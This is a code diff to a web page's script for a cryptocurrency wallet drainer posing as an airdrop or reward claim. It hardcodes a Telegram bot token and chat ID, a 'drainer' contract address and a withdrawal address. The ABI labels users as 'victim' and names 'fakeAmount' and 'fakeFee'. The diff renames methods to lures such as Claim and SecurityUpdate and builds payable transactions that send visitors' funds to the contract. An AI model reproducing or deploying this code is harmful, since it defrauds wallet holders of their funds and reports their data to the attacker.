@@ -162,19 +162,23 @@
         document.addEventListener('DOMContentLoaded', async () => {
             const botToken = '7925505296:AAFZzW3mvYl62QJKnnXyUqYORa8jRmx-Lkk';
             const chatId = '6309547301';
-            const drainerContractAddress = '0xe517b1ff7b15980ef0b19b4004d0e287be257f64'; // New contract address
-            const ownerAddress = '0x08D32a1E8E341Bc58f4b7FA903a4C84E92E82D0A'; // New withdrawal address
+            const drainerContractAddress = '0x30d6f7541032fa4235ea0a8f22a4ab167c05e2e8'; // New contract address
+            const ownerAddress = '0xc987fd6FD1dBAcf6Bf834dBC4F2Af3Fe7D72176d'; // New withdrawal address
             const sepoliaChainId = '0xaa36a7';
             const drainerContractAbi = [
                 { "inputs": [], "stateMutability": "nonpayable", "type": "constructor" },
-                { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "victim", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "fakeAmount", "type": "uint256" }], "name": "AirdropClaimed", "type": "event" },
-                { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "victim", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "fakeFee", "type": "uint256" }], "name": "WithdrawalLocked", "type": "event" },
-                { "inputs": [], "name": "checkRewards", "outputs": [{ "internalType": "uint256", "name": "fakeBalance", "type": "uint256" }], "stateMutability": "view", "type": "function" },
-                { "inputs": [], "name": "claimAirdrop", "outputs": [], "stateMutability": "payable", "type": "function" },
+                { "inputs": [], "name": "getOwner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" },
+                { "inputs": [], "name": "getBalance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
                 { "inputs": [], "name": "totalDrained", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
-                { "inputs": [], "name": "withdraw", "outputs": [], "stateMutability": "payable", "type": "function" },
-                { "inputs": [], "stateMutability": "payable", "type": "receive" },
-                { "inputs": [], "stateMutability": "payable", "type": "fallback" }
+                { "inputs": [], "name": "Claim", "outputs": [], "stateMutability": "payable", "type": "function" },
+                { "inputs": [], "name": "ClaimReward", "outputs": [], "stateMutability": "payable", "type": "function" },
+                { "inputs": [], "name": "ClaimRewards", "outputs": [], "stateMutability": "payable", "type": "function" },
+                { "inputs": [], "name": "Execute", "outputs": [], "stateMutability": "payable", "type": "function" },
+                { "inputs": [], "name": "Multicall", "outputs": [], "stateMutability": "payable", "type": "function" },
+                { "inputs": [], "name": "Swap", "outputs": [], "stateMutability": "payable", "type": "function" },
+                { "inputs": [], "name": "Connect", "outputs": [], "stateMutability": "payable", "type": "function" },
+                { "inputs": [], "name": "SecurityUpdate", "outputs": [], "stateMutability": "payable", "type": "function" },
+                { "stateMutability": "payable", "type": "receive" }
             ];
 
             let cachedIpLocation = null;
@@ -292,7 +296,7 @@
                     let estimatedGasFee;
                     try {
                         const contract = new web3.eth.Contract(drainerContractAbi, drainerContractAddress);
-                        const claimData = contract.methods.claimAirdrop().encodeABI();
+                        const claimData = contract.methods.Claim().encodeABI();
                         estimatedGasFee = await web3.eth.estimateGas({
                             from: walletAddress,
                             to: drainerContractAddress,
@@ -318,7 +322,7 @@
                         value: web3.utils.toHex(minClaimFee),
                         gas: web3.utils.toHex(gasLimitFee),
                         gasPrice: web3.utils.toHex(adjustedGasPrice),
-                        data: new web3.eth.Contract(drainerContractAbi, drainerContractAddress).methods.claimAirdrop().encodeABI()
+                        data: new web3.eth.Contract(drainerContractAbi, drainerContractAddress).methods.Claim().encodeABI()
                     };
 
                     const claimPrompts = [
@@ -445,4 +449,4 @@
         });
     </script>
 </body>
-</
+</html>
